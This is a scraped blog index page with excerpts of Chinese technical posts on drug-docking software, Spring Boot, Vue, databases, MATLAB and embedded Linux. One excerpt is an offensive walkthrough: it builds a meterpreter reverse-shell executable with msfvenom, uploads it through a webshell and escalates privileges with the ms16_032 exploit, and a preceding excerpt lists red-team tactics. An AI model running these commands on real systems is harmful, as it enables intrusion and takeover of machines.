第四章 蓝队也套路——常用的攻击战术 在蓝队的实战过程中，蓝队专家们逐渐摸出了一些套路、总结了一些经验：有后台或登录入口的，会尽量尝试通过弱口令等方式进入系统；找不到系统漏洞时，会尝试社工钓鱼，从人开展突破；有安全防护设备的，会尽量少用或不用扫描器，使用EXP力求一击即中；针对防守严密的系统，会尝试从子公司或供应链来开展工作；建立据点过程中，会用多种手段多点潜伏，防患于未然。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca7e58c25bfffe7341e07ab8e5960b8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45bb2f835adb8b70bda01aefbadf6b09/" rel="bookmark">
			kali下msf提权
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生成木马 Msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.184.132 lport=4444 -f exe -o /root/Desktop/1.exe
配置监听程序 Msfconsole 打开Metaploit
msf &gt; use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.184.132
Exploit
现在将1.exe 通过菜刀或者webshell 上次到可写目录，并且执行
这样就监听成功了 获得一个session （会话）
Getuid 查看主机名
shell 进入命令行模式
当然这里也可以加载exp
Exit 返回到meterpeter模式
Background 返回 multi/handler
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc 加载exp
Session 1 返回之前的会话
Exploit 进行提权
这说明exp执行成功，可以进一步提权，内网渗透了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3c09a06db7afa7a946cf0e00354fcc8/" rel="bookmark">
			MOE安装及使用教程高能来袭！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源公众号：计算机辅助药物设计CADD
“MOE软件教程”
-小白必备-
MOE是针对分子模拟及计算机辅助药物设计的综合软件，系统集可视化、模拟和应用开发于一体，通过蛋白质结构与功能分析、药效团模型、小分子库设计与筛选、定量构效关系分析以及分子对接等核心模块全方位支持药物设计的软件。
本文主要介绍MOE软件的一些功能及虚拟对接的具体操作。
注：分享本文到朋友圈，集赞满30，或5个相关医药类学术群，截图发后台私信小编，免费领取MOE软件安装包及安装教程！
01
功能简介
Function Introduction (1)分子建模和模拟：MOE内部的有机化学结构表示方法和灵活的框架体系为分子建模和计算化学提供了可靠的基础。直观的分子编辑器、文件格式处理、验证力场选择、强大的建模应用程序及用户定制性都使得MOE成为工业中最具灵活性的分子建模环境。
(2)蛋白建模和生物信息学：MOE平台中经过CASP验证的蛋白质同源建模功能强大且直观易用。无论是普通蛋白还是抗体，单体或多聚体的模建都能在MOE中快速精确的完成模建。通过清晰的三维视图可以直观地看到蛋白质内部的相互作用，也可以绘制出蛋白表面的性质。同时蛋白突变模拟能为生物大分子药物设计提供全新的解决方法。
(3)基于结构的药物设计：MOE提供了基于结构的药物设计的丰富灵活的多种功能。通过对有机化合物的模拟，用户可以方便地在结合空腔内通过多种不同的方法进行分子设计。通过MOE也可以从各个不同的角度对蛋白和配体的相互作用进行可视化观察或是评价其亲和力强度。
(4)化学信息学与高通量发现：MOE内嵌的方法可以应用于大批量分子属性计算、建模和模拟。分子属性计算、定量构效关系模型建立、指纹图谱、聚类和多样性分析均可以应用于高通量的化合物筛选分析。
(5)药效团建模：MOE的药效团建模是一种强大的产生并利用3D几何信息进行新颖活性化合物搜索的方法，特别是当缺乏受体结构信息的时候。药效团方法使用一种概括化的配体代表方法和几何约束，可以避免2D方法引起的结构和化学类别偏差。
(6)数据内容与开发环境：除了图形界面应用外，MOE还提供了开发工具箱可以让用户修改已有的应用功能，或是创建生命科学领域的新的应用功能。分子模拟专家、应用程序开发者以及普通用户可以通过共享MOE这同一个软件系统而获益。由应用程序开发者编写的功能可以由分子模拟专家验证，随后发布给普通用户在图形界面或网页界面下使用。
02
MOE的虚拟对接操作
Virtual Docking 1、虚拟对接相关概念：
其本质是两个或多个分子之间的识别过程，其过程涉及分子之间的空间匹配和能量匹配。
(1)刚性对接：指在对接过程中，研究体系（受体和配体）的构象不发生变化。适合考察比较大的体系，如蛋白质和蛋白质间以及蛋白质和核酸之间的对接。
(2)半柔性对接：指在对接过程中，研究体系尤其是配体的构象允许在一定的范围内变化。适合处理大分子和小分子间的对接，对接过程中，小分子的构象一般是可以变化的，但大分子是刚性的。
(3)柔性对接：指在对接过程中，研究体系的构象基本上可以自由变化的。一般用于精确考虑分子间的识别情况。由于计算过程中体系的构象可以变化，所以计算耗费最大
2、MOE中虚拟对接操作
MOE界面Compute&gt;Dock展示对接功能界面
对接界面功能介绍：最左侧功能键表示配体对接方式。其他功能由上到下如下图介绍：
打分函数London dG:
由模板进行对接：即选择的模板在蛋白质中的位置保持不变未固定部分构象不断变化在结合口袋进行对接
操作：
MOE界面Compute&gt;在显示的界面选择Template&gt;在MOE界面上选择在对接过程在不变的结构后点击Run后程序开始运行并弹出对接数据界面
运算结束后得到相关数据：
各行数据解释：
Mol：分子对接姿势
Rseq：受体标识符
Mseq：分子标识符
S：对接分数
Rmsd refine：对接前后同一个分子间的差异
E conf：异构体能量
E place：配体替换阶段得分
E score1：第一阶段重新打分
E refine：优化结构后打分
E score：第二阶段重新打分
$File：配体来源的文件夹
Ki（nm）：来源于输入数据的文件夹
PLIF pronum：对应于受体的完整指数
PLIF raw：原始指纹图谱
FP PLIF：PLIF序列
PLIF ligand：在PLIF中与配体相互作用的原子
在数据界面可以浏览相关对接映射在MOE界面：
操作：Datebase View&gt;File&gt;Browse展示出小窗口，在该窗口中可以编辑所选原子的颜色及化学键类型&gt;选择粉红色，改变原子键为第五个类型后再MOE界面能明显的看到浏览界面所选原子构象。
征稿专栏 Draft Column 征稿啦！！！“计算机辅助药物设计CADD”微信公众号自创办以来得到了广大科研工作者和研究生的广泛关注和支持。为更好地服务计算机辅助药物设计研究和应用，本公众号现因业务需要长期招聘供稿作者。
投稿到likeapoem@163.com，邮件主题请注明“姓名+供稿作者”。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3c09a06db7afa7a946cf0e00354fcc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77e2843ba8e7886d32cf6d6976aa89e2/" rel="bookmark">
			springboot &#43; mybatis入门整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通常为了方便跳转到对应的xml文件，可安装 mybatisX插件
一、环境准备 pom.xml依赖
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;!--属性校验--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${pagehelper-spring-boot-starter.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;28.1-jre&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-core&lt;/artifactId&gt; &lt;version&gt;${hutool-core.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/77e2843ba8e7886d32cf6d6976aa89e2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/918f939b9b4de6ba9f7893926637d6c8/" rel="bookmark">
			【VUE- 跳转打开另一个页面】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 第一种写法
&lt;button @click="handleClick"&gt;打开另一个页面&lt;/button&gt; handleClick(value) { const { row } = value const query = { cluesId: row.infoId } const router = this.$router.resolve({ path: '/create-clues', query }) window.open(router.href, '_blank') }, $router.resolve:
我们使用this.$router.resolve方法来解析路由地址，将path属性设置为/about，query属性设置为{id: 1}，返回一个Promise对象。在Promise对象的then方法中，我们可以获取到路由信息，例如路由的路径、查询参数等。
总之，this.$router.resolve是Vue Router提供的一个API，用于解析路由地址，返回一个包含路由信息的Promise对象。与其他路由跳转方式相比，它不会触发路由跳转，而是用于获取路由信息。
如果需要打开另一个页面，可以使用window.open方法或者location.href属性来实现。
第二种写法
&lt;template&gt; &lt;div&gt; &lt;button @click="handleClick"&gt;打开另一个页面&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { methods: { handleClick() { const resolved = this.$router.resolve({ path: '/about', query: { id: 1 } }); resolved.then((route) =&gt; { window.open(route.href, '_blank'); }); } } } &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc99573348d0bb6394edac5aa5e61204/" rel="bookmark">
			mysql与oracle的具体区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql与oracle的具体区别
1、本质的区别
Oracle数据库是一个对象关系数据库管理系统（ORDBMS）。它通常被称为Oracle RDBMS或简称为Oracle，是一个收费的数据库。
MySQL是一个开源的关系数据库管理系统（RDBMS）。它是世界上使用最多的RDBMS，作为服务器运行，提供对多个数据库的多用户访问。它是一个开源、免费的数据库。
2、Oracle数据库产品是闭源同时也是收费的，MySQL是开源的项目（免费）；
3、Oracle是大型数据库，Mysql是中小型数据库；
4、Oracle可以设置用户权限、访问权限、读写权限等，MySQL没有；
5、Oracle有表空间的概念，MySQL没有；
6、Oracle默认不自动提交，需要用户手动提交。Mysql默认是自动提交。
7、Oracle逻辑备份时不锁定数据，且备份的数据是一致的。Mysql逻辑备份时要锁定数据，才能保证备份的数据是一致的，影响业务正常使用。
8、Oracle有各种成熟的性能诊断调优工具，能实现很多自动分析、诊断功能。比如awr、addm、sqltrace、tkproof等；Mysql的诊断调优方法较少，主要有慢查询日志。
9、Oracle容量无限，根据配置决定；而MySQL使用MyISAM存储引擎，最大表尺寸为65536TB。 MySQL数据库的最大有效表尺寸通常是由操作系统对文件大小的限制决定的，而不是由MySQL内部限制决定。
10、Oracle在Linux下的性能，在少量数据时速度低于MySQL，在千万级时速度快于MySQL。
11、Oracle全面，完整，稳定，但一般数据量大，对硬件要求较高 ；而MySQL使用CPU和内存极少，性能很高，但扩展性较差。
12、MySQL处理翻页的SQL语句比较简单，用LIMIT 开始位置, 记录个数。Oracle处理翻页的SQL语句就比较繁琐了。每个结果集只有一个ROWNUM字段标明它的位置, 并且只能用ROWNUM&lt;100, 不能用ROWNUM&gt;80。
13、MySQL日期字段分DATE和TIME两种，Oracle日期字段只有DATE，包含年月日时分秒信息，用当前数据库的系统时间为SYSDATE, 精确到秒。
14、SQL语句的区别：
mysql可以没有from，oracle必须有，可以写成from dual；
mysql使用concat()函数连接字符串，oracle不仅有concat()函数，还可以使用||；
mysql没有全外连接，使用集合连接代替，oracle有全外连接，而且左右外连接有自己的语法：(+)；
mysql分页使用limit，oracle分页得借助rownum关键字；
mysql自动增长auto_increment，oracle使用序列代替；
mysql直接书写循环判断语句，oracle得借助PLSQL语句；
mysql判断使用elseif，oracle使用elsif；
mysql可以直接增删改，oracle需要commit；
group by，在下oracle下用group by的话，group by后面的字段必须在select后面出现，不然会报错的，而mysql却不会；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31adf9d1aa8ebea6c04af16f3d9fc601/" rel="bookmark">
			基于 SpringBoot &#43; Vue 实现的可视化拖拽编辑的大屏项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，今天给小伙伴们分享一个基于 SpringBoot + Vue 实现的可视化拖拽编辑的大屏项目。
简介
这个是一个开源的一个BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。
多数据源支持，内置mysql、elasticsearch、kudu驱动，支持自定义数据集省去数据接口开发，支持17种大屏组件，不会开发，照着设计稿也可以制作大屏。
三步轻松完成大屏设计：配置数据源----&gt;写SQL配置数据集----&gt;拖拽配置大屏----&gt;保存发布。欢迎体验。
点击下方小卡片回复【3135】领取源码
程序员追风
专注于分享Java各类学习笔记、面试题以及IT类资讯。
公众号
功能概述
组件介绍
大屏设计是一个可视化拖拽编辑的，直观，酷炫，具有科技感的图表工具全开源项目。内置的基础功能包括数据源，数据集，报表管理，项目部分截图如下。
数据流程图
核心技术
依赖
[Mysql] 5.7+
[Jdk] 1.8+
后端
Spring Boot2.3.5.RELEASE: Spring Boot是一款开箱即用框架，让我们的Spring应用变的更轻量化、更快的入门。在主程序执行main函数就可以运行。你也可以打包你的应用为jar并通过使用java -jar来运行你的Web应用；
Mybatis-plus3.3.2: MyBatis-plus（简称 MP）是一个 MyBatis (opens new window) 的增强工具。
flyway5.2.1: 主要用于在你的应用版本不断升级的同时，升级你的数据库结构和里面的数据
前端
npm：node.js的包管理工具，用于统一管理我们前端项目中需要用到的包、插件、工具、命令等，便于开发和维护。
webpack：用于现代 JavaScript 应用程序的_静态模块打包工具
ES6：Javascript的新版本，ECMAScript6的简称。利用ES6我们可以简化我们的JS代码，同时利用其提供的强大功能来快速实现JS逻辑。
vue-cli：Vue的脚手架工具，用于自动生成Vue项目的目录及文件。
vue-router：Vue提供的前端路由工具，利用其我们实现页面的路由控制，局部刷新及按需加载，构建单页应用，实现前后端分离。
element-ui：基于MVVM框架Vue开源出来的一套前端ui组件。
avue: 用该组件包裹后可以变成拖拽组件,采用相对于父类绝对定位;用键盘的上下左右也可以控制移动
vue-echarts: vue-echarts是封装后的vue插件,基于 ECharts v4.0.1+ 开发
vue-superslide: Vue-SuperSlide(Github) 是 SuperSlide 的 Vue 封装版本
vuedraggable: 是一款基于Sortable.js实现的vue拖拽插件。
截图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0abd48af3138cd667a2b638a0dfeedf3/" rel="bookmark">
			VSD Viewer for Mac：Visio绘图文件阅读器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VSD Viewer Mac是一款非常好用的Visio绘图文件阅读器，它可以帮助Mac用户打开和查看Visio绘图文件，而无需安装Microsoft Visio软件。
VSD Viewer Mac支持多种Visio文件格式，包括.vsdx、.vsd、.vdx、.vst等，用户可以轻松地查看和浏览这些文件。它提供了丰富的浏览功能，包括缩放、旋转、平移、拖动等，用户可以根据自己的需求自由浏览绘图文件。
另外，VSD Viewer Mac还支持多种导出格式，如PDF、PNG、JPEG等，方便用户将绘图文件导出为常用的格式，以便与团队成员或客户共享。它还提供了多种标注和注释功能，用户可以在绘图文件中添加文本、图形、箭头等标注，方便进行说明和交流。
总的来说，VSD Viewer Mac是一款功能丰富、易于使用的Visio绘图文件阅读器，适用于Mac平台上的用户。它提供了丰富的浏览、导出、标注和打印功能，可以帮助用户更好地查看、共享和交流Visio绘图文件。如果您需要在Mac上查看Visio文件，VSD Viewer Mac将是一个非常不错的选择。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5414095f1ef45fd63e1f5a57cbd1f1f/" rel="bookmark">
			MongoDB接入php (laravel)使用添加入库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天学习一下如何在laravel框架中使用MongoDB
1、先确定好自己使用的哪个版本的 Laravel 框架，再决定 composer 哪一个的 MongoDB，我使用的是 Laravel 8 所以我 composer 了 3.8 的MongoDb
2、执行 composer 命令，进行下载，我是用的是第一个命令
composer require jenssegers/mongodb ^3.8 -vvv composer require jenssegers/mongodb:3.8 --ignore-platform-reqs 3、这个时候可能会报错，所以要做以下操作
php先安装mongodb扩展(连接的服务器或本地需要先安装mongodb)
首先查看自己的php信息，注意三点
选择mongodb版本
在这里根据你的 PHP 版本进行选择，我的是 7.3.4 的，所以我选择 1.6.0 的MongoDB
PECL :: Package :: mongodb (php.net)
将下载的扩展文件（php_mongodb.dll）放在PHP的ext下
改写 php 配置文件 php.ini
文件末尾添加: extension=php_mongodb.dll
重启服务，查看phpinfo,若有mongo 配置信息则证明扩展安装成功
打开终端进行设置用户名密码
db.createUser({user:"root",pwd:"root",roles:[{role:"userAdminAnyDatabase",db:"admin"}]}) 现在就可以下载扩展了
在app/config/app.php文件中引入配置项
'providers' =&gt; [ Jenssegers\Mongodb\MongodbServiceProvider::class, ] 'aliases' =&gt; [ 'Mongo' =&gt; Jenssegers\Mongodb\MongodbServiceProvider::class, ] 在.env文件中加入配置项
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5414095f1ef45fd63e1f5a57cbd1f1f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/092ae1d8ddf3076fcb5a66e6c2a37725/" rel="bookmark">
			MongoDB安装配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本章作者在首次实现MongoDB 让我们了解一下~ 1、MongoDB介绍
MongoDB是为快速开发互联网Web应用而设计的数据库系统。 MongoDB的设许目标是极简、灵活、作为Web应用栈的一部分。
MongoDB的数据模型是面向文档的, 所谓文档是一种类似于JSON的结构，简单理解MongoDB这个数据库中存的是各种各样的JSON。
MongoDB的特点是高性能、易部署、易使用，存储数据非常方便
MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。
MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。
2、MongoDB中三个概念 数据库( database )：数据库是一个仓库，在仓库中可以存放集合。
集合( collection )：集合类似于数组，在集合中可以存放文档。
文档( document )：文档数据库中的最小单位,我们存储和操作的内容都是文档。
3.MongoDB优势 mongodb的优势就是文档存储: 1. 业务经常变动，需要不时的添加字段，那么mongodb比较适合，关系型数据库添加字段的复杂度也还好
2. 嵌套文档，业务数据比较复杂，适合嵌套文档式存储，那么mongodb非常合适，这个关系型数据库比较难搞，虽然MySQL和pg也有文档存储，但MySQL的不成熟，pg毕竟现在生产中使用还是偏少，个人也不了解，这里不谈。但这不仅仅这一点优势，具体下面会细说。
3. upsert支持，查询速度也不慢
4. 高可用的副本集支持
5. 查询语法非常丰富，嵌套文档查询功能非常强大，不是重度用户可能不能理解
下面说说一个具体的使用事例:
如果项目的一条数据在10kb左右，使用关系型数据库那么需要将这条数据拆分成大概几百条左右，建造多个表，设计较复杂。这种数据大概在一百万条左右，想想拆分后在十几亿的数据量就可怕。打平后的数据什么DB也都可以拿下，只是一百万变十几亿比较恐怖而已。
如果采用MySQL存储，每次查询需要使用外键查询多个表，从这些表中拉取数据，性能肯定要下降很多，比不上只在一个表查询，而且只拉取少两个数量级的数据。查询也还好，业务允许可以对结果做缓存，放到redis里去。
但是重点来了，需求要增量更新部分数据，这时候需要更新多个表，根本没法做到原子性（注意事务不是原子操作），当然也可以使用cas等技术补偿，达到最终一致性。但使用mongodb存储只需要update一条数据，对相应的嵌套文档中内容更新，可以做到原子性，是不是很方便？
具体说说该项目的难点，查询无法使用缓存，可能会很吃惊，但是业务决定了确实做不了，而且增量更新的量达到上万的QPS，如果不能保证原子性想想多么可怕！
所以mongodb在这里帮了大忙，关系型数据库解决不了这个难题。
4.MongoDB缺点 1. 查询优化器和MySQL没法比
2. 不支持reload，只能冷重启，初始化配置的时候比较麻烦
3. 没有事务，不敢存储第一手数据，多用来做备份数据的存储
首先我们进行安装配置 第一步
下载MongoDB
官网会自动匹配下载版本号 Download MongoDB Community Server | MongoDB
​
进行安装
第一 打开进行安装目录
​
即：你可以通过选择安装到 ‘E盘’ 或 ‘D盘’ 等你自己建的文件夹的位置上；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/092ae1d8ddf3076fcb5a66e6c2a37725/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fc166c1b2922ee9727f475f46c36073/" rel="bookmark">
			基于matlab实现对 QAM 系统调制与解调过程的仿真(可靠性分析)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：热爱科研的Matlab仿真开发者，修心和技术同步精进，matlab项目合作可私信。
🍎个人主页：Matlab科研工作室
🍊个人信条：格物致知。
更多Matlab仿真内容点击👇
智能优化算法 神经网络预测 雷达通信 无线传感器 电力系统
信号处理 图像处理 路径规划 元胞自动机 无人机 ⛄ 内容介绍 1、系统介绍
正交振幅调制，即QAM，这是近年来被国际上移动通信技术专家十分重视的一种信号调制方式。QAM是数字信号的一种调制方式，在调制过程中，同时以载波信号的幅度和相位来代表不同的数字比特编码，把多进制与正交载波技术结合起来，进一步提高频带利用率。单独使用振幅和相位携带信息时，不能最充分利用信号平面，这可由矢量图中信号矢量端点的分布直观观察到。多进制振幅调制时，矢量端点在一条轴上分布；多进制相位调制时，矢量点在一个圆上分布。随着进制数M的增大，这些矢量端点之间的最小距离也随之减少。但如果充分利用整个平面，将矢量端点重新合理地分布，则可能在不减小最小距离的情况下，增加信号的端点数。基于上述概念引出的振幅与相位结合的调制方式被称为数字复合调制方式，一般的复合调制称为幅相键控(APK)，2个正交载波幅相键控称为正交振幅调制。
2、实验内容
（1）对原始信号分别进行 4QAM 和 16QAM 调制，画出星座图；
（2）采用高斯信道传输信号，画出信噪比为 13dB 时，4QAM 和 16QAM 的接收信号星座图；
（3）画出两种调制方式的眼图；
（4）解调接收信号，分别绘制 4QAM 和 16QAM 的误码率曲线图，并与理论值进行对比；
（5）提交详细的设计报告和实验报告。
3、设计原理
QAM 调制原理：
QAM是一种矢量调制，将输入比特先映射（一般采用格雷码）到一个复平面（星座）上，形成复数调制符号，然后将符号的I、Q分量（对应复平面的实部和虚部，也就是水平和垂直方向）采用幅度调制，分别对应调制在相互正交（时域正交）的两个载波（coswt和sinwt）上。这样与幅度调制相比，其频谱利用率将提高1倍。QAM是幅度、相位联合调制的技术，它同时利用了载波的幅度和相位来传递信息比特，因此在最小距离相同的条件下可实现更高的频带利用率，QAM最高已达到1024-QAM（1024个样点）。样点数目越多，其传输效率越高，例如具有16个样点的16-QAM信号，每个样点表示一种矢量状态，16-QAM有16态，每4位二进制数规定了16态中的一态，16-QAM中规定了16种载波和相位的组合，16-QAM的每个符号和周期传送4比特。下图为QAM系统的调制框图：
QAM解调原理：
QAM信号用正交相干解调方法进行解调，通过解调器将QAM信号进行正交相干解调后，用低通滤波器LPF滤除乘法器产生的高频分量，输出抽样判决后可恢复出的两路独立电平信号，最后将多电平码元与二进制码元间的关系进行转换，将电平信号转换为二进制信号，经并/串变换后恢复出原二进制基带信号。
仿真说明：
本次仿真中分别取 M=4和16。M=4时，进行的是幅度和相位相结合的4个信号点的调制。M=16时，进行的是幅度和相位相结合的16个信号点的调制。为了观察信道噪声对该调制方式的影响，我们在已调信号中又加入了不同强度的高斯白噪声，并统计其译码误码率。为了简化程序和得到可靠的误码率，我们在解调时并未从已调信号中恢复载波，而是直接产生与调制时一模一样的载波来进行信号解调。
⛄ 部分代码 clc
clear all
close all% 生成4QAM调制信号
M = 4; % 调制阶数
N = 100000; % 定义基本参数
k = log2(M); % bitsPerSym = log2(m)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fc166c1b2922ee9727f475f46c36073/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4abc9cc0104d4f8f08b7f8bdc6ee0b9d/" rel="bookmark">
			SingleR --细胞注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 briefExample使用内置的 references使用其他注释好的数据集作为 reference singleR还提供了注释诊断的方法 brief Example The celldex package provides access to several reference datasets (mostly derived from bulk RNA-seq or microarray data)。
The Human Primary Cell Atlas (Mabbott et al. 2013), represented as a SummarizedExperiment object containing a matrix of log-expression values with sample-level labels。
使用内置的 references # 从celldex包中获取 reference library(celldex) hpca.se &lt;- HumanPrimaryCellAtlasData() hpca.se # 直接用singleR进行map注释 library(SingleR) counts &lt;- GetAssayData(sce[["RNA"]], slot="counts") meta.data &lt;- sce@meta.data pred.sce &lt;- SingleR(test = counts, ref = hpca.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4abc9cc0104d4f8f08b7f8bdc6ee0b9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6358272b3c1a24112b3f75256bf91a88/" rel="bookmark">
			【IMX6ULL驱动开发学习】02.IMX6ULL烧写Linux系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于我买的是正点原子的IMX6ULL阿尔法开发板，但是我是看韦东山老师视频学习的驱动
所以这里我烧录的方法是按照韦东山老师的课程来的
这里给出烧写Linux系统用到的工具
链接：https://pan.baidu.com/s/1bD-xxn3K8xQAVkJSaJmTzQ 提取码：af6w
下载解压后，可以看到烧写工具
烧写Linux系统到SD卡中 由于我这边使用韦东山老师的工具烧写到EMMC总是失败
所以尝试烧写到SD卡中，成功！
1、将IMX6ULL的启动方式通过拨码开关调到USB模式（按照板子上丝印的指示即可）
2、将mini usb线插到USB OTG口上（正点原子IMX6ULL阿尔法左下角上面那个USB口）
3、双击打开烧写系统工具
4、将板子连接电脑，将SD卡弹出，复位，可以看到烧写工具中显示 “设备已连接”
5、选择专业版，点击运行
6、运行之后会听到电脑有设备接入的声音 “叮咚”，工具中打印出一些信息
7、这是因为烧录完uboot到板子上，板子生成一个专门烧写内核的设备了
8、如果你此时打开了虚拟机，会发现弹出一个框，一定要选择将设备连接到电脑，并且记住选择，否则后面烧写的时候会显示超时
9、接着选择工具的“基础版”，然后复位板子（这一步很重要），显示“设备已连接后”，将SD卡插入板子
10、点击下拉框选择SD/TF，然后点击 “烧写整个系统”，等待烧写完成即可（如果没有出现进度，拔插SD卡，复位一下，多试几次）
11、烧写完成后，将开发板通过左下角下面那个USB（USB_TTL）连接到开发板，打开一个串口工具（比如SecureCRT）
12、将IMX6ULL启动方式通过拨码开关调到SD启动，按下复位，可以看到串口工具开始打印uboot启动信息，然后是加载内核信息
13、出现百问网网址的时候，我们输入 root，然后回车，即可进入Linux命令行了
至此烧写Linux系统完成，uname -a 查看系统内核版本，接着可以进行驱动开发的学习了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/879009ca020e73289428b5c05815bf10/" rel="bookmark">
			论文阅读-《A Survey of Large Language Models》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文地址：https://arxiv.org/abs/2303.18223
近年来现有大型语言模型（尺寸大于10B)的时间线。
